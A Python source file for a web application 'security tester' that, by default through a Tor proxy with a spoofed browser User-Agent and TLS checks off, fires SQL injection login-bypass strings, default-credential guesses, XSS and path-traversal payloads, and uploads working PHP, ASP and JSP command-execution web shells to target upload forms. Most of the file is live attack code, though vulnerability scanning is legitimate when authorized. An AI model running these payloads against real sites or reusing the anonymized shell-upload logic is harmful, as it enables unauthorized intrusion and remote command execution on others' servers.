import requests
from urllib.parse import urljoin, urlparse, parse_qs
import re
import json
import time
from datetime import datetime
from models import ScanSession, Finding, db
from crypto_utils import encrypt_data
from anonymity_manager import AnonymityManager
import logging

class WebSecurityTester:
    def __init__(self):
        self.anonymity = AnonymityManager()
        self.is_testing = False
        self.session = requests.Session()
        
    def comprehensive_web_test(self, session_id, target_url, test_config):
        """
        Perform comprehensive web application security testing
        """
        try:
            session = ScanSession.query.get(session_id)
            if not session:
                logging.error(f"Scan session {session_id} not found")
                return False
            
            session.status = 'running'
            db.session.commit()
            
            self.is_testing = True
            
            # Setup anonymity if required
            if test_config.get('use_anonymity', True):
                self.anonymity.setup_tor_proxy()
                proxy_config = self.anonymity.get_proxy_config()
                if proxy_config:
                    self.session.proxies = proxy_config
            
            # Configure session
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            
            # Perform various web security tests
            self._test_information_disclosure(session_id, target_url)
            self._test_authentication_bypass(session_id, target_url)
            self._test_session_management(session_id, target_url)
            self._test_input_validation(session_id, target_url)
            self._test_file_upload(session_id, target_url)
            self._test_access_controls(session_id, target_url)
            self._test_crypto_implementation(session_id, target_url)
            
            session.status = 'completed'
            db.session.commit()
            self.is_testing = False
            
            return True
            
        except Exception as e:
            logging.error(f"Web security test failed: {str(e)}")
            session.status = 'failed'
            db.session.commit()
            self.is_testing = False
            return False
    
    def _test_information_disclosure(self, session_id, target_url):
        """Test for information disclosure vulnerabilities"""
        try:
            # Test common sensitive files
            sensitive_files = [
                'robots.txt',
                'sitemap.xml',
                '.htaccess',
                'web.config',
                'crossdomain.xml',
                'phpinfo.php',
                'server-info',
                'server-status',
                'admin',
                'administrator',
                'backup',
                'config',
                'database',
                'db',
                'wp-admin',
                'wp-config.php'
            ]
            
            for file_path in sensitive_files:
                try:
                    url = urljoin(target_url, file_path)
                    response = self.session.get(url, timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        # Check for sensitive information
                        sensitive_indicators = [
                            'password', 'secret', 'key', 'token', 'api',
                            'database', 'mysql', 'postgresql', 'mongodb',
                            'admin', 'root', 'config'
                        ]
                        
                        content_lower = response.text.lower()
                        found_indicators = [ind for ind in sensitive_indicators if ind in content_lower]
                        
                        if found_indicators or file_path in ['robots.txt', 'sitemap.xml']:
                            severity = 'high' if found_indicators else 'low'
                            self._create_finding(
                                session_id,
                                'information_disclosure',
                                severity,
                                f'Sensitive File Accessible: {file_path}',
                                f'File {file_path} is accessible and may contain sensitive information',
                                target_url,
                                remediation='Restrict access to sensitive files and directories'
                            )
                
                except requests.RequestException:
                    continue
                
                time.sleep(0.2)  # Rate limiting
            
            # Test for debug information
            try:
                response = self.session.get(target_url, timeout=10, verify=False)
                
                debug_indicators = [
                    'debug', 'trace', 'stack trace', 'exception',
                    'error_reporting', 'display_errors', 'warning',
                    'mysql_connect', 'database error', 'sql error'
                ]
                
                content_lower = response.text.lower()
                for indicator in debug_indicators:
                    if indicator in content_lower:
                        self._create_finding(
                            session_id,
                            'information_disclosure',
                            'medium',
                            'Debug Information Disclosure',
                            f'Application reveals debug information: {indicator}',
                            target_url,
                            remediation='Disable debug mode in production environment'
                        )
                        break
            
            except requests.RequestException:
                pass
            
        except Exception as e:
            logging.error(f"Information disclosure test failed: {str(e)}")
    
    def _test_authentication_bypass(self, session_id, target_url):
        """Test for authentication bypass vulnerabilities"""
        try:
            # Test for common admin panels
            admin_paths = [
                'admin', 'administrator', 'admin.php', 'admin.asp',
                'admin.aspx', 'admin.jsp', 'login', 'login.php',
                'wp-admin', 'manager', 'control-panel'
            ]
            
            for path in admin_paths:
                try:
                    url = urljoin(target_url, path)
                    response = self.session.get(url, timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        # Check if login form exists
                        login_indicators = ['password', 'login', 'username', 'email']
                        content_lower = response.text.lower()
                        
                        if any(indicator in content_lower for indicator in login_indicators):
                            # Test SQL injection in login
                            self._test_login_sql_injection(session_id, url)
                            
                            # Test default credentials
                            self._test_default_credentials(session_id, url)
                
                except requests.RequestException:
                    continue
                
                time.sleep(0.3)  # Rate limiting
            
        except Exception as e:
            logging.error(f"Authentication bypass test failed: {str(e)}")
    
    def _test_login_sql_injection(self, session_id, login_url):
        """Test login forms for SQL injection"""
        try:
            # Get login form
            response = self.session.get(login_url, timeout=10, verify=False)
            
            # Extract form fields
            form_fields = self._extract_form_fields(response.text)
            
            if form_fields:
                # SQL injection payloads for authentication bypass
                sql_payloads = [
                    "admin' --",
                    "admin' /*",
                    "' or 1=1--",
                    "' or 1=1#",
                    "') or '1'='1--",
                    "admin'or 1=1 or ''='"
                ]
                
                for payload in sql_payloads:
                    try:
                        # Prepare login data
                        login_data = {}
                        for field in form_fields:
                            if 'user' in field.lower() or 'email' in field.lower():
                                login_data[field] = payload
                            elif 'pass' in field.lower():
                                login_data[field] = 'password'
                            else:
                                login_data[field] = 'test'
                        
                        # Submit login form
                        response = self.session.post(login_url, data=login_data, timeout=10, verify=False)
                        
                        # Check for successful bypass indicators
                        success_indicators = [
                            'dashboard', 'welcome', 'logout', 'admin panel',
                            'control panel', 'management', 'profile'
                        ]
                        
                        content_lower = response.text.lower()
                        if any(indicator in content_lower for indicator in success_indicators):
                            self._create_finding(
                                session_id,
                                'authentication_bypass',
                                'critical',
                                'SQL Injection Authentication Bypass',
                                f'Authentication bypassed using SQL injection payload: {payload}',
                                login_url,
                                remediation='Use parameterized queries for authentication'
                            )
                            return
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(0.5)  # Rate limiting
        
        except Exception as e:
            logging.debug(f"Login SQL injection test failed: {str(e)}")
    
    def _test_default_credentials(self, session_id, login_url):
        """Test for default credentials"""
        try:
            # Get login form
            response = self.session.get(login_url, timeout=10, verify=False)
            form_fields = self._extract_form_fields(response.text)
            
            if form_fields:
                # Common default credentials
                default_creds = [
                    ('admin', 'admin'),
                    ('admin', 'password'),
                    ('admin', '123456'),
                    ('administrator', 'administrator'),
                    ('root', 'root'),
                    ('guest', 'guest'),
                    ('user', 'user')
                ]
                
                for username, password in default_creds:
                    try:
                        # Prepare login data
                        login_data = {}
                        for field in form_fields:
                            if 'user' in field.lower() or 'email' in field.lower():
                                login_data[field] = username
                            elif 'pass' in field.lower():
                                login_data[field] = password
                            else:
                                login_data[field] = 'test'
                        
                        # Submit login form
                        response = self.session.post(login_url, data=login_data, timeout=10, verify=False)
                        
                        # Check for successful login
                        if 'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                            self._create_finding(
                                session_id,
                                'weak_authentication',
                                'high',
                                'Default Credentials Found',
                                f'Login successful with default credentials: {username}:{password}',
                                login_url,
                                remediation='Change default passwords and implement strong authentication'
                            )
                            return
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(1)  # Rate limiting
        
        except Exception as e:
            logging.debug(f"Default credentials test failed: {str(e)}")
    
    def _test_session_management(self, session_id, target_url):
        """Test session management security"""
        try:
            # Test for session fixation
            initial_response = self.session.get(target_url, timeout=10, verify=False)
            initial_cookies = self.session.cookies
            
            # Check cookie security attributes
            for cookie in initial_cookies:
                cookie_issues = []
                
                if not cookie.secure:
                    cookie_issues.append('Missing Secure flag')
                
                if not hasattr(cookie, 'httponly') or not cookie.httponly:
                    cookie_issues.append('Missing HttpOnly flag')
                
                if hasattr(cookie, 'samesite') and not cookie.samesite:
                    cookie_issues.append('Missing SameSite attribute')
                
                if cookie_issues:
                    self._create_finding(
                        session_id,
                        'session_management',
                        'medium',
                        f'Insecure Cookie: {cookie.name}',
                        f'Cookie security issues: {", ".join(cookie_issues)}',
                        target_url,
                        remediation='Set Secure, HttpOnly, and SameSite flags on cookies'
                    )
        
        except Exception as e:
            logging.debug(f"Session management test failed: {str(e)}")
    
    def _test_input_validation(self, session_id, target_url):
        """Test input validation vulnerabilities"""
        try:
            # Get forms from the page
            response = self.session.get(target_url, timeout=10, verify=False)
            forms = self._extract_forms(response.text)
            
            for form in forms:
                # Test various injection payloads
                injection_payloads = [
                    '<script>alert("XSS")</script>',
                    '"><script>alert("XSS")</script>',
                    "' OR '1'='1",
                    '../../../etc/passwd',
                    '{{7*7}}',  # Template injection
                    '${7*7}',   # Expression language injection
                    '<%=7*7%>',  # JSP injection
                ]
                
                for payload in injection_payloads:
                    try:
                        # Prepare form data
                        form_data = {}
                        for field in form.get('fields', []):
                            form_data[field] = payload
                        
                        # Submit form
                        form_url = urljoin(target_url, form.get('action', ''))
                        if form.get('method', 'get').lower() == 'post':
                            response = self.session.post(form_url, data=form_data, timeout=10, verify=False)
                        else:
                            response = self.session.get(form_url, params=form_data, timeout=10, verify=False)
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            vulnerability_type = 'XSS' if '<script>' in payload else 'Input Injection'
                            self._create_finding(
                                session_id,
                                'input_validation',
                                'medium',
                                f'{vulnerability_type} Vulnerability',
                                f'Input validation bypass detected with payload: {payload}',
                                form_url,
                                remediation='Implement proper input validation and output encoding'
                            )
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(0.3)  # Rate limiting
        
        except Exception as e:
            logging.debug(f"Input validation test failed: {str(e)}")
    
    def _test_file_upload(self, session_id, target_url):
        """Test file upload vulnerabilities"""
        try:
            # Get forms from the page
            response = self.session.get(target_url, timeout=10, verify=False)
            
            # Look for file upload forms
            if 'type="file"' in response.text:
                # Test malicious file uploads
                malicious_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                    ('shell.asp', '<%eval request("cmd")%>'),
                    ('shell.jsp', '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'),
                    ('test.txt.php', 'PHP shell content')
                ]
                
                for filename, content in malicious_files:
                    try:
                        files = {'file': (filename, content, 'text/plain')}
                        response = self.session.post(target_url, files=files, timeout=10, verify=False)
                        
                        # Check if file was uploaded successfully
                        if response.status_code == 200 and ('uploaded' in response.text.lower() or 'success' in response.text.lower()):
                            self._create_finding(
                                session_id,
                                'file_upload',
                                'high',
                                'Unrestricted File Upload',
                                f'Malicious file upload successful: {filename}',
                                target_url,
                                remediation='Implement file type validation and upload restrictions'
                            )
                    
                    except requests.RequestException:
                        continue
                    
                    time.sleep(0.5)  # Rate limiting
        
        except Exception as e:
            logging.debug(f"File upload test failed: {str(e)}")
    
    def _test_access_controls(self, session_id, target_url):
        """Test access control vulnerabilities"""
        try:
            # Test for directory browsing
            directory_urls = [
                urljoin(target_url, 'admin/'),
                urljoin(target_url, 'uploads/'),
                urljoin(target_url, 'files/'),
                urljoin(target_url, 'backup/'),
                urljoin(target_url, 'config/')
            ]
            
            for url in directory_urls:
                try:
                    response = self.session.get(url, timeout=10, verify=False)
                    
                    # Check for directory listing
                    if ('Index of' in response.text or 
                        'Directory Listing' in response.text or
                        '<pre>' in response.text and '..' in response.text):
                        
                        self._create_finding(
                            session_id,
                            'access_control',
                            'medium',
                            'Directory Browsing Enabled',
                            f'Directory listing accessible at: {url}',
                            url,
                            remediation='Disable directory browsing and implement proper access controls'
                        )
                
                except requests.RequestException:
                    continue
                
                time.sleep(0.2)  # Rate limiting
        
        except Exception as e:
            logging.debug(f"Access control test failed: {str(e)}")
    
    def _test_crypto_implementation(self, session_id, target_url):
        """Test cryptographic implementation"""
        try:
            if target_url.startswith('https://'):
                # Test SSL/TLS configuration
                parsed_url = urlparse(target_url)
                hostname = parsed_url.hostname
                port = parsed_url.port or 443
                
                # Check for weak SSL/TLS configuration
                try:
                    import ssl
                    context = ssl.create_default_context()
                    
                    with socket.create_connection((hostname, port), timeout=10) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cipher = ssock.cipher()
                            protocol = ssock.version()
                            
                            # Check for weak protocols
                            if protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                                self._create_finding(
                                    session_id,
                                    'crypto_weakness',
                                    'high',
                                    'Weak TLS Protocol',
                                    f'Server supports weak TLS protocol: {protocol}',
                                    target_url,
                                    remediation='Disable weak TLS protocols and use TLS 1.2 or higher'
                                )
                            
                            # Check for weak ciphers
                            if cipher and any(weak in cipher[0] for weak in ['RC4', 'DES', 'MD5']):
                                self._create_finding(
                                    session_id,
                                    'crypto_weakness',
                                    'medium',
                                    'Weak Cipher Suite',
                                    f'Server uses weak cipher: {cipher[0]}',
                                    target_url,
                                    remediation='Configure strong cipher suites'
                                )
                
                except:
                    pass
        
        except Exception as e:
            logging.debug(f"Crypto implementation test failed: {str(e)}")
    
    def _extract_form_fields(self, html_content):
        """Extract form field names from HTML"""
        form_fields = []
        
        # Simple regex to find input fields
        input_pattern = r'<input[^>]*name\s*=\s*["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(input_pattern, html_content, re.IGNORECASE)
        form_fields.extend(matches)
        
        return form_fields
    
    def _extract_forms(self, html_content):
        """Extract form information from HTML"""
        forms = []
        
        # Simple form extraction
        form_pattern = r'<form[^>]*action\s*=\s*["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        form_matches = re.findall(form_pattern, html_content, re.IGNORECASE | re.DOTALL)
        
        for action, form_content in form_matches:
            fields = self._extract_form_fields(form_content)
            method_match = re.search(r'method\s*=\s*["\']([^"\']+)["\']', form_content, re.IGNORECASE)
            method = method_match.group(1) if method_match else 'get'
            
            forms.append({
                'action': action,
                'method': method,
                'fields': fields
            })
        
        return forms
    
    def _create_finding(self, session_id, finding_type, severity, title, description, 
                       target_url, remediation=None):
        """Create and store a security finding"""
        finding = Finding(
            scan_session_id=session_id,
            finding_type=finding_type,
            severity=severity,
            title=title,
            description=encrypt_data(description),
            target_host=encrypt_data(target_url),
            target_port=None,
            remediation=encrypt_data(remediation) if remediation else None
        )
        
        db.session.add(finding)
        db.session.commit()
    
    def stop_test(self):
        """Stop the current web security test"""
        self.is_testing = False
